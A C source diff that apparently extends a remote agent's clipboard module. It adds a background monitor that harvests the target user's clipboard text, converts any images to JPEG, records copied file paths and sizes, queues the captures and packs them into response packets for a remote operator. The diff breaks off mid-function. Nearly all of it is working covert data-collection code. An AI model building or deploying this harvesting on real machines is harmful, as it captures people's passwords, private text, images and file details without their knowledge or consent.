@@ -7,6 +7,53 @@
 #include "clipboard.h"
 #include "clipboard_image.h"
 
+/*! @brief the Limit on the size of the data we'll keep in memory. */
+#define MAX_CLIPBOARD_MONITOR_MEMORY (1024 * 1024 * 40)
+
+typedef enum _ClipboadrCaptureType
+{
+	CapText, CapFiles, CapImage
+} ClipboardCaptureType;
+
+typedef struct _ClipboardImage
+{
+	DWORD dwWidth;
+	DWORD dwHeight;
+	DWORD dwImageSize;
+	LPBYTE lpImageContent;
+} ClipboardImage;
+
+typedef struct _ClipboardFile
+{
+	LPSTR lpPath;
+	QWORD qwSize;
+	struct _ClipboardFile* pNext;
+} ClipboardFile;
+
+typedef struct _ClipboardCapture
+{
+	ClipboardCaptureType captureType;
+	union
+	{
+		LPSTR lpText;
+		ClipboardImage* lpImage;
+		ClipboardFile* lpFiles;
+	};
+	SYSTEMTIME stCaptureTime;
+	DWORD dwSize;
+	struct _ClipboardCapture* pNext;
+} ClipboardCapture;
+
+typedef struct _ClipboardCaptureList
+{
+	ClipboardCapture* pHead;
+	ClipboardCapture* pTail;
+	/*! @brief Lock to handle concurrent access to the clipboard capture list. */
+	LOCK* pClipboardCaptureLock;
+	/*! @brief Indication of how much data we have in memory. */
+	DWORD dwClipboardDataSize;
+} ClipboardCaptureList;
+
 typedef struct _ClipboardState
 {
 #ifdef _WIN32
@@ -16,6 +63,8 @@ typedef struct _ClipboardState
 	HWND hClipboardWindow;
 	/*! @brief Handle to the next window in the clipboard chain. */
 	HWND hNextViewer;
+	/*! @brief List of clipboard captures. */
+	ClipboardCaptureList captureList;
 #endif
 	/*! @brief Indicates if the thread is running or not. */
 	BOOL bRunning;
@@ -25,16 +74,15 @@ typedef struct _ClipboardState
 	EVENT* hPauseEvent;
 	/*! @brief Signalled when the caller wants the thread to resume. */
 	EVENT* hResumeEvent;
-	/*! @brief Automatically download files copied to the clipboard. */
-	BOOL bDownloadFiles;
-	/*! @brief Automatically download image content copied to the clipboard. */
-	BOOL bDownloadImages;
+	/*! @brief Capture image data that's found on the clipboard. */
+	BOOL bCaptureImageData;
 	/*! @brief Reference to the clipboard monitor thread. */
 	THREAD* hThread;
 } ClipboardState;
 
 /*! @brief Pointer to the state for the monitor thread. */
 static ClipboardState* gClipboardState = NULL;
+static BOOL gClipboardInitialised = FALSE;
 
 #ifdef _WIN32
 
@@ -81,9 +129,496 @@ typedef BOOL(WINAPI * PCLOSEHANDLE)(HANDLE hObject);
 /*! @brief GetFileSizeEx function pointer type. */
 typedef BOOL(WINAPI * PGETFILESIZEEX)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
 
+static PCLOSECLIPBOARD pCloseClipboard = NULL;
+static PCLOSEHANDLE pCloseHandle = NULL;
+static PCREATEFILEA pCreateFileA = NULL;
+static PDRAGQUERYFILEA pDragQueryFileA = NULL;
+static PEMPTYCLIPBOARD pEmptyClipboard = NULL;
+static PENUMCLIPBOARDFORMATS pEnumClipboardFormats = NULL;
+static PGETCLIPBOARDDATA pGetClipboardData = NULL;
+static PGETFILESIZEEX pGetFileSizeEx = NULL;
+static PGLOBALALLOC pGlobalAlloc = NULL;
+static PGLOBALFREE pGlobalFree = NULL;
+static PGLOBALLOCK pGlobalLock = NULL;
+static PGLOBALUNLOCK pGlobalUnlock = NULL;
+static POPENCLIPBOARD pOpenClipboard = NULL;
+static PSETCLIPBOARDDATA pSetClipboardData = NULL;
+
+DWORD initialise_clipboard()
+{
+#ifdef _WIN32
+	DWORD dwResult;
+	HMODULE hKernel32 = NULL;
+	HMODULE hUser32 = NULL;
+	HMODULE hShell32 = NULL;
+
+	do
+	{
+		dprintf("[EXTAPI CLIPBOARD] Loading user32.dll");
+		if ((hUser32 = LoadLibraryA("user32.dll")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load user32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Loading kernel32.dll");
+		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load kernel32.dll");
+		}
+
+		if ((hShell32 = LoadLibraryA("shell32.dll")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load shell32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalLock");
+		if ((pGlobalLock = (PGLOBALLOCK)GetProcAddress(hKernel32, "GlobalLock")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalLock in kernel32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalUnlock");
+		if ((pGlobalUnlock = (PGLOBALUNLOCK)GetProcAddress(hKernel32, "GlobalUnlock")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalUnlock in kernel32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for OpenClipboard");
+		if ((pOpenClipboard = (POPENCLIPBOARD)GetProcAddress(hUser32, "OpenClipboard")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate OpenClipboard in user32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for CloseClipboard");
+		if ((pCloseClipboard = (PCLOSECLIPBOARD)GetProcAddress(hUser32, "CloseClipboard")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in user32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for GetClipboardData");
+		if ((pGetClipboardData = (PGETCLIPBOARDDATA)GetProcAddress(hUser32, "GetClipboardData")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetClipboardData in user32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for EnumClipboardFormats");
+		if ((pEnumClipboardFormats = (PENUMCLIPBOARDFORMATS)GetProcAddress(hUser32, "EnumClipboardFormats")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EnumClipboardFormats in user32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for CreateFileA");
+		if ((pCreateFileA = (PCREATEFILEA)GetProcAddress(hKernel32, "CreateFileA")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CreateFileA in kernel32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for CloseHandle");
+		if ((pCloseHandle = (PCLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseHandle in kernel32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for GetFileSizeEx");
+		if ((pGetFileSizeEx = (PGETFILESIZEEX)GetProcAddress(hKernel32, "GetFileSizeEx")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetFileSizeEx in kernel32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for DragQueryFileA");
+		if ((pDragQueryFileA = (PDRAGQUERYFILEA)GetProcAddress(hShell32, "DragQueryFileA")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in shell32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalAlloc");
+		if ((pGlobalAlloc = (PGLOBALALLOC)GetProcAddress(hKernel32, "GlobalAlloc")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalAlloc in kernel32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for EmptyClipboard");
+		if ((pEmptyClipboard = (PEMPTYCLIPBOARD)GetProcAddress(hUser32, "EmptyClipboard")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EmptyClipboard in user32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for SetClipboardData");
+		if ((pSetClipboardData = (PSETCLIPBOARDDATA)GetProcAddress(hUser32, "SetClipboardData")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate SetClipboardData in user32.dll");
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalFree");
+		if ((pGlobalFree = (PGLOBALFREE)GetProcAddress(hKernel32, "GlobalFree")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalFree in kernel32.dll");
+		}
+
+		dwResult = ERROR_SUCCESS;
+		gClipboardInitialised = TRUE;
+	} while (0);
+
+	return dwResult;
+#else
+	return ERROR_NOT_SUPPORTED;
+#endif
+}
+
+VOID destroy_clipboard_monitor_capture(ClipboardCaptureList* pCaptureList, BOOL bRemoveLock)
+{
+	ClipboardFile* pFile, *pNextFile;
+
+	while (pCaptureList->pHead)
+	{
+		pCaptureList->pTail = pCaptureList->pHead->pNext;
+
+		switch (pCaptureList->pHead->captureType)
+		{
+		case CapText:
+			free(pCaptureList->pHead->lpText);
+			break;
+		case CapImage:
+			free(pCaptureList->pHead->lpImage->lpImageContent);
+			free(pCaptureList->pHead->lpImage);
+			break;
+		case CapFiles:
+			pFile = pCaptureList->pHead->lpFiles;
+
+			while (pFile)
+			{
+				pNextFile = pFile->pNext;
+				free(pFile->lpPath);
+				free(pFile);
+				pFile = pNextFile;
+			}
+			break;
+		}
+
+		free(pCaptureList->pHead);
+
+		pCaptureList->pHead = pCaptureList->pTail;
+	}
+
+	if (bRemoveLock && pCaptureList->pClipboardCaptureLock)
+	{
+		lock_destroy(pCaptureList->pClipboardCaptureLock);
+		pCaptureList->pClipboardCaptureLock = NULL;
+	}
+
+	pCaptureList->pHead = pCaptureList->pTail = NULL;
+	pCaptureList->dwClipboardDataSize = 0;
+}
+
+VOID timestamp_to_string(SYSTEMTIME* pTime, char buffer[40])
+{
+	dprintf("[EXTAPI CLIPBOARD] parsing timestamp %p", pTime);
+	sprintf_s(buffer, 40, "%04u-%02u-%02u %02u:%02u:%02u.%04u",
+		pTime->wYear, pTime->wMonth, pTime->wDay,
+		pTime->wHour, pTime->wMinute, pTime->wSecond, pTime->wMilliseconds);
+	dprintf("[EXTAPI CLIPBOARD] timestamp parsed");
+}
+
+VOID dump_clipboard_capture(Packet* pResponse, ClipboardCapture* pCapture, BOOL bCaptureImageData)
+{
+	ClipboardFile* pFile;
+	Tlv entries[4];
+	char timestamp[40];
+
+	dprintf("[EXTAPI CLIPBOARD] Dumping clipboard capture");
+
+	memset(entries, 0, sizeof(entries));
+	memset(timestamp, 0, sizeof(timestamp));
+
+	timestamp_to_string(&pCapture->stCaptureTime, timestamp);
+	entries[0].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP;
+	entries[0].header.length = lstrlenA(timestamp) + 1;
+	entries[0].buffer = (PUCHAR)timestamp;
+	dprintf("[EXTAPI CLIPBOARD] Timestamp added: %s", timestamp);
+
+	switch (pCapture->captureType)
+	{
+	case CapText:
+		dprintf("[EXTAPI CLIPBOARD] Dumping text %s", pCapture->lpText);
+		entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT;
+		entries[1].header.length = lstrlenA(pCapture->lpText) + 1;
+		entries[1].buffer = (PUCHAR)pCapture->lpText;
+
+		packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, entries, 2);
+		dprintf("[EXTAPI CLIPBOARD] Text added to packet");
+		break;
+	case CapImage:
+		dprintf("[EXTAPI CLIPBOARD] Dumping image %ux%x", pCapture->lpImage->dwWidth, pCapture->lpImage->dwHeight);
+		entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX;
+		entries[1].header.length = sizeof(DWORD);
+		entries[1].buffer = (PUCHAR)&pCapture->lpImage->dwWidth;
+
+		entries[2].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY;
+		entries[2].header.length = sizeof(DWORD);
+		entries[2].buffer = (PUCHAR)&pCapture->lpImage->dwHeight;
+
+		entries[3].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA;
+		entries[3].header.length = pCapture->lpImage->dwImageSize;
+		entries[3].buffer = (PUCHAR)pCapture->lpImage->lpImageContent;
+
+		packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG, entries, bCaptureImageData && pCapture->lpImage->lpImageContent ? 4 : 3);
+		dprintf("[EXTAPI CLIPBOARD] Image added to packet");
+		break;
+	case CapFiles:
+		pFile = pCapture->lpFiles;
+
+		while (pFile)
+		{
+			dprintf("[EXTAPI CLIPBOARD] Dumping file %p", pFile);
+
+			dprintf("[EXTAPI CLIPBOARD] Adding path %s", pFile->lpPath);
+			entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME;
+			entries[1].header.length = lstrlenA(pFile->lpPath) + 1;
+			entries[1].buffer = (PUCHAR)pFile->lpPath;
+
+			dprintf("[EXTAPI CLIPBOARD] Adding size %llu", htonq(pFile->qwSize));
+			entries[2].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE;
+			entries[2].header.length = sizeof(QWORD);
+			entries[2].buffer = (PUCHAR)&pFile->qwSize;
+
+			dprintf("[EXTAPI CLIPBOARD] Adding group");
+			packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, entries, 3);
+
+			pFile = pFile->pNext;
+			dprintf("[EXTAPI CLIPBOARD] Moving to next");
+		}
+		break;
+	}
+}
+
+VOID dump_clipboard_capture_list(Packet* pResponse, ClipboardCaptureList* pCaptureList, BOOL bCaptureImageData, BOOL bPurge)
+{
+	ClipboardCapture* pCapture = NULL;
+
+	lock_acquire(pCaptureList->pClipboardCaptureLock);
+	pCapture = pCaptureList->pHead;
+	while (pCapture)
+	{
+		dump_clipboard_capture(pResponse, pCapture, bCaptureImageData);
+		pCapture = pCapture->pNext;
+	}
+
+	if (bPurge)
+	{
+		destroy_clipboard_monitor_capture(pCaptureList, FALSE);
+	}
+	lock_release(pCaptureList->pClipboardCaptureLock);
+}
+
+BOOL add_clipboard_capture(ClipboardCapture* pNewCapture, ClipboardCaptureList* pList)
+{
+	if (pNewCapture->dwSize + pList->dwClipboardDataSize > MAX_CLIPBOARD_MONITOR_MEMORY)
+	{
+		return FALSE;
+	}
+
+	lock_acquire(pList->pClipboardCaptureLock);
+
+	pNewCapture->pNext = NULL;
+	if (pList->pTail == NULL)
+	{
+		pList->pHead = pList->pTail = pNewCapture;
+	}
+	else
+	{
+		pList->pTail->pNext = pNewCapture;
+		pList->pTail = pList->pTail->pNext = pNewCapture;
+	}
+	pList->dwClipboardDataSize += pNewCapture->dwSize;
+	lock_release(pList->pClipboardCaptureLock);
+	return TRUE;
+}
+
+DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
+{
+	DWORD dwResult;
+	DWORD dwCount;
+	HANDLE hSourceFile = NULL;
+	PCHAR lpClipString = NULL;
+	HGLOBAL hClipboardData = NULL;
+	HDROP hFileDrop = NULL;
+	UINT uFormat = 0;
+	UINT uFileIndex = 0;
+	UINT uFileCount = 0;
+	CHAR lpFileName[MAX_PATH];
+	LARGE_INTEGER largeInt = { 0 };
+	LPBITMAPINFO lpBI = NULL;
+	PUCHAR lpDIB = NULL;
+	ConvertedImage image;
+	ClipboardFile* pFile = NULL;
+	ClipboardCapture* pCapture = (ClipboardCapture*)malloc(sizeof(ClipboardCapture));
+
+	memset(pCapture, 0, sizeof(ClipboardCapture));
+
+	pCapture->pNext = NULL;
+	dprintf("[EXTAPI CLIPBOARD] Getting timestamp");
+	GetSystemTime(&pCapture->stCaptureTime);
+	do
+	{
+		// Try to get a lock on the clipboard
+		if (!pOpenClipboard(NULL))
+		{
+			dwResult = GetLastError();
+			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to open the clipboard", dwResult);
+		}
+
+		dprintf("[EXTAPI CLIPBOARD] Clipboard locked, attempting to get data...");
+
+		while (uFormat = pEnumClipboardFormats(uFormat))
+		{
+			if (uFormat == CF_TEXT)
+			{
+				// there's raw text on the clipboard
+				if ((hClipboardData = pGetClipboardData(CF_TEXT)) != NULL
+					&& (lpClipString = (PCHAR)pGlobalLock(hClipboardData)) != NULL)
+				{
+					dprintf("[EXTAPI CLIPBOARD] Clipboard text captured: %s", lpClipString);
+					pCapture->captureType = CapText;
+					dwCount = lstrlenA(lpClipString) + 1;
+					pCapture->lpText = (char*)malloc(dwCount);
+					memset(pCapture->lpText, 0, dwCount);
+					strncpy_s(pCapture->lpText, dwCount, lpClipString, dwCount - 1);
+
+					pGlobalUnlock(hClipboardData);
+				}
+			}
+			else if (uFormat == CF_DIB)
+			{
+				dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard bitmap data");
+				// an image of some kind is on the clipboard
+				if ((hClipboardData = pGetClipboardData(CF_DIB)) != NULL
+					&& (lpBI = (LPBITMAPINFO)pGlobalLock(hClipboardData)) != NULL)
+				{
+					dprintf("[EXTAPI CLIPBOARD] CF_DIB grabbed, extracting dimensions.");
+
+					// grab the bitmap image size
+					pCapture->captureType = CapImage;
+					pCapture->lpImage = (ClipboardImage*)malloc(sizeof(ClipboardImage));
+					memset(pCapture->lpImage, 0, sizeof(ClipboardImage));
+					pCapture->lpImage->dwWidth = htonl(lpBI->bmiHeader.biWidth);
+					pCapture->lpImage->dwHeight = htonl(lpBI->bmiHeader.biHeight);
+
+					// only download the image if they want it
+					dprintf("[EXTAPI CLIPBOARD] Image is %dx%d and %s be downloaded", lpBI->bmiHeader.biWidth, lpBI->bmiHeader.biHeight,
+						bCaptureImageData ? "WILL" : "will NOT");
+
+					if (bCaptureImageData)
+					{
+						lpDIB = ((PUCHAR)lpBI) + get_bitmapinfo_size(lpBI, TRUE);
+
+						// TODO: add the ability to encode with multiple encoders and return the smallest image.
+						if (convert_to_jpg(lpBI, lpDIB, 75, &image) == ERROR_SUCCESS)
+						{
+							dprintf("[EXTAPI CLIPBOARD] Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize);
+							pCapture->lpImage->lpImageContent = image.pImageBuffer;
+							pCapture->lpImage->dwImageSize = image.dwImageBufferSize;
+
+							// Just leaving this in for debugging purposes later on
+							//hSourceFile = CreateFileA("C:\\temp\\foo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+							//WriteFile(hSourceFile, image.pImageBuffer, image.dwImageBufferSize, &largeInt.LowPart, NULL);
+							//CloseHandle(hSourceFile);
+						}
+						else
+						{
+							dwResult = GetLastError();
+							dprintf("[EXTAPI CLIPBOARD] Failed to convert clipboard image to JPG");
+						}
+					}
+
+					pGlobalUnlock(hClipboardData);
+				}
+				else
+				{
+					dwResult = GetLastError();
+					dprintf("[EXTAPI CLIPBOARD] Failed to get access to the CF_DIB information");
+				}
+			}
+			else if (uFormat == CF_HDROP)
+			{
+				// there's one or more files on the clipboard
+				dprintf("[EXTAPI CLIPBOARD] Files have been located on the clipboard");
+				dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard file drop data");
+				if ((hClipboardData = pGetClipboardData(CF_HDROP)) != NULL
+					&& (hFileDrop = (HDROP)pGlobalLock(hClipboardData)) != NULL)
+				{
+					uFileCount = pDragQueryFileA(hFileDrop, (UINT)-1, NULL, 0);
+
+					dprintf("[EXTAPI CLIPBOARD] Parsing %u file(s) on the clipboard.", uFileCount);
+					pCapture->captureType = CapFiles;
+					pFile = pCapture->lpFiles;
+
+					for (uFileIndex = 0; uFileIndex < uFileCount; ++uFileIndex)
+					{
+						if (pFile == NULL)
+						{
+							dprintf("[EXTAPI CLIPBOARD] First file");
+							pCapture->lpFiles = pFile = (ClipboardFile*)malloc(sizeof(ClipboardFile));
+						}
+						else
+						{
+							dprintf("[EXTAPI CLIPBOARD] Extra file");
+							pFile->pNext = (ClipboardFile*)malloc(sizeof(ClipboardFile));
+							pFile = pFile->pNext;
+						}
+
+						memset(pFile, 0, sizeof(ClipboardFile));
+
+						dprintf("[EXTAPI CLIPBOARD] Attempting to get file data");
+						if (pDragQueryFileA(hFileDrop, uFileIndex, lpFileName, sizeof(lpFileName)))
+						{
+							dprintf("[EXTAPI CLIPBOARD] Clipboard file entry: %s", lpFileName);
+
+							dwCount = lstrlenA(lpFileName) + 1;
+							pFile->lpPath = (char*)malloc(dwCount);
+							memset(pFile->lpPath, 0, dwCount);
+							strncpy_s(pFile->lpPath, dwCount, lpFileName, dwCount - 1);
+
+							memset(&largeInt, 0, sizeof(largeInt));
+
+							if ((hSourceFile = pCreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != NULL)
+							{
+								if (pGetFileSizeEx(hSourceFile, &largeInt))
+								{
+									pFile->qwSize = htonq(largeInt.QuadPart);
+								}
+
+								pCloseHandle(hSourceFile);
+							}
+
+						}
+					}
+
+					pGlobalUnlock(hClipboardData);
+				}
+			}
+		}
+
+		dwResult = GetLastError();
+		dprintf("[EXTAPI CLIPBOARD] Finished with result %u (%x)", dwResult, dwResult);
+
+		pCloseClipboard();
+	} while (0);
+
+	if (dwResult != ERROR_SUCCESS)
+	{
+		free(pCapture);
+		pCapture = NULL;
+	}
+	*ppCapture = pCapture;
+
+	return dwResult;
+}
+
 LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, LPARAM lParam, WPARAM wParam)
 {
+	DWORD dwResult;
 	ClipboardState* pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);
+	ClipboardCapture* pNewCapture = NULL;
 
 	if (!pState)
 	{
@@ -124,6 +659,23 @@ LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, LPARAM lParam
 		if (pState->bRunning)
 		{
 			dprintf("[EXTAPI CLIPBOARD] thread is running, harvesting clipboard %x", hWnd);
+			dwResult = capture_clipboard(pState->bCaptureImageData, &pNewCapture);
+			if (dwResult == ERROR_SUCCESS && pNewCapture != NULL)
+			{
+				if (add_clipboard_capture(pNewCapture, &pState->captureList))
+				{
+					dprintf("[EXTAPI CLIPBOARD] Capture added %x", hWnd);
+				}
+				else
+				{
+					free(pNewCapture);
+					dprintf("[EXTAPI CLIPBOARD] Data size too big, ignoring data %x", hWnd);
+				}
+			}
+			else
+			{
+				dprintf("[EXTAPI CLIPBOARD] Failed to harvest from clipboard %x: %u (%x)", hWnd, dwResult, dwResult);
+			}
 		}
 		else
 		{
@@ -233,284 +785,37 @@ DWORD request_clipboard_get_data(Remote *remote, Packet *packet)
 {
 #ifdef _WIN32
 	DWORD dwResult;
-	HMODULE hKernel32 = NULL;
-	HMODULE hUser32 = NULL;
-	HMODULE hShell32 = NULL;
-
-	PGLOBALLOCK pGlobalLock = NULL;
-	PGLOBALUNLOCK pGlobalUnlock = NULL;
-
-	POPENCLIPBOARD pOpenClipboard = NULL;
-	PCLOSECLIPBOARD pCloseClipboard = NULL;
-	PGETCLIPBOARDDATA pGetClipboardData = NULL;
-	PENUMCLIPBOARDFORMATS pEnumClipboardFormats = NULL;
-	PDRAGQUERYFILEA pDragQueryFileA = NULL;
-	PCREATEFILEA pCreateFileA = NULL;
-	PCLOSEHANDLE pCloseHandle = NULL;
-	PGETFILESIZEEX pGetFileSizeEx = NULL;
-
-	HANDLE hSourceFile = NULL;
-	PCHAR lpClipString = NULL;
-	HGLOBAL hClipboardData = NULL;
-	HDROP hFileDrop = NULL;
-	UINT uFormat = 0;
-	UINT uFileIndex = 0;
-	UINT uFileCount = 0;
-	CHAR lpFileName[MAX_PATH];
-	Tlv entries[2] = { 0 };
-	LARGE_INTEGER largeInt = { 0 };
-	LPBITMAPINFO lpBI = NULL;
-	PUCHAR lpDIB = NULL;
-	ConvertedImage image;
-	BOOL bImageDownload = FALSE;
-	DWORD dwWidth;
-	DWORD dwHeight;
-	Tlv imageTlv[3];
-
+	ClipboardCapture* pCapture = NULL;
+	BOOL bDownload = FALSE;
 	Packet *pResponse = packet_create_response(packet);
 
 	do
 	{
-		dprintf("[EXTAPI CLIPBOARD] Loading user32.dll");
-		if ((hUser32 = LoadLibraryA("user32.dll")) == NULL)
+		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
+		if (!gClipboardInitialised)
 		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load user32.dll");
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
 		}
 
-		dprintf("[EXTAPI CLIPBOARD] Loading kernel32.dll");
-		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
+		bDownload = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_DOWNLOAD);
+
+		if ((dwResult = capture_clipboard(bDownload, &pCapture)) != ERROR_SUCCESS)
 		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load kernel32.dll");
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] failed to read clipboard data");
 		}
 
-		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalLock");
-		if ((pGlobalLock = (PGLOBALLOCK)GetProcAddress(hKernel32, "GlobalLock")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalLock in kernel32.dll");
-		}
+		dprintf("[EXTAPI CLIPBOARD] writing to socket");
+		dump_clipboard_capture(pResponse, pCapture, bDownload);
+		dprintf("[EXTAPI CLIPBOARD] written to socket");
 
-		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalUnlock");
-		if ((pGlobalUnlock = (PGLOBALUNLOCK)GetProcAddress(hKernel32, "GlobalUnlock")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalUnlock in kernel32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for OpenClipboard");
-		if ((pOpenClipboard = (POPENCLIPBOARD)GetProcAddress(hUser32, "OpenClipboard")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate OpenClipboard in user32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for CloseClipboard");
-		if ((pCloseClipboard = (PCLOSECLIPBOARD)GetProcAddress(hUser32, "CloseClipboard")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in user32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for GetClipboardData");
-		if ((pGetClipboardData = (PGETCLIPBOARDDATA)GetProcAddress(hUser32, "GetClipboardData")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetClipboardData in user32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for EnumClipboardFormats");
-		if ((pEnumClipboardFormats = (PENUMCLIPBOARDFORMATS)GetProcAddress(hUser32, "EnumClipboardFormats")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EnumClipboardFormats in user32.dll");
-		}
-
-		// Try to get a lock on the clipboard
-		if (!pOpenClipboard(NULL))
-		{
-			dwResult = GetLastError();
-			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to open the clipboard", dwResult);
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Clipboard locked, attempting to get data...");
-
-		while (uFormat = pEnumClipboardFormats(uFormat))
-		{
-			if (uFormat == CF_TEXT)
-			{
-				// there's raw text on the clipboard
-				if ((hClipboardData = pGetClipboardData(CF_TEXT)) != NULL
-					&& (lpClipString = (PCHAR)pGlobalLock(hClipboardData)) != NULL)
-				{
-					dprintf("[EXTAPI CLIPBOARD] Clipboard text captured: %s", lpClipString);
-					packet_add_tlv_string(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, lpClipString);
-
-					pGlobalUnlock(hClipboardData);
-				}
-			}
-			else if (uFormat == CF_DIB)
-			{
-				dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard bitmap data");
-				// an image of some kind is on the clipboard
-				if ((hClipboardData = pGetClipboardData(CF_DIB)) != NULL
-					&& (lpBI = (LPBITMAPINFO)pGlobalLock(hClipboardData)) != NULL)
-				{
-					dprintf("[EXTAPI CLIPBOARD] CF_DIB grabbed, extracting dimensions.");
-
-					// grab the bitmap image size
-					dwWidth = htonl(lpBI->bmiHeader.biWidth);
-					dwHeight = htonl(lpBI->bmiHeader.biHeight);
-
-					imageTlv[0].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX;
-					imageTlv[0].header.length = sizeof(UINT);
-					imageTlv[0].buffer = (PUCHAR)&dwWidth;
-					imageTlv[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY;
-					imageTlv[1].header.length = sizeof(UINT);
-					imageTlv[1].buffer = (PUCHAR)&dwHeight;
-
-					// only download the image if they want it
-					bImageDownload = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_DOWNLOAD);
-					dprintf("[EXTAPI CLIPBOARD] Image is %dx%d and %s be downloaded", lpBI->bmiHeader.biWidth, lpBI->bmiHeader.biHeight,
-						bImageDownload ? "WILL" : "will NOT");
-
-					if (!bImageDownload)
-					{
